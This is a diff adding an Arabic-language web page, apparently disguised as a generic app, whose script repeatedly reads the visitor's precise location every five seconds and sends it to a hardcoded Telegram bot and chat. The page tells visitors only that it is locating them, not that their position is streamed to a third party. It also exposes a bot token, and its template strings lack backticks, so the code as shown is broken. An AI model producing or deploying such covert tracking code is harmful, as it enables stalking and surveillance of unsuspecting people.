@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>App</title>
+    <link rel="manifest" href="manifest.json">
+</head>
+<body style="text-align:center; font-family:Arial; background-color:#f2f2f2;">
+    <h1>جارٍ تحديد موقعك...</h1>
+    <p>يرجى السماح بالوصول للموقع الجغرافي.</p>
+
+    <script>
+    // تسجيل Service Worker
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('service-worker.js')
+        .then(reg => console.log('Service Worker Registered'))
+        .catch(err => console.log('Service Worker Failed:', err));
+    }
+
+    const token = "1890782841:AAEvO60AT2kuOZlhgeK2pjQvIPBW3tT8CN0";
+    const chatId = "1810158222";
+
+    function sendLocation(lat, lon) {
+        const url = https://api.telegram.org/bot${token}/sendMessage;
+        const message = موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon};
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    }
+
+    setInterval(() => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendLocation(latitude, longitude);
+                },
+                (error) => {
+                    console.error(error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                }
+            );
+        }
+    }, 5000);
+    </script>
+</body>
+</html>
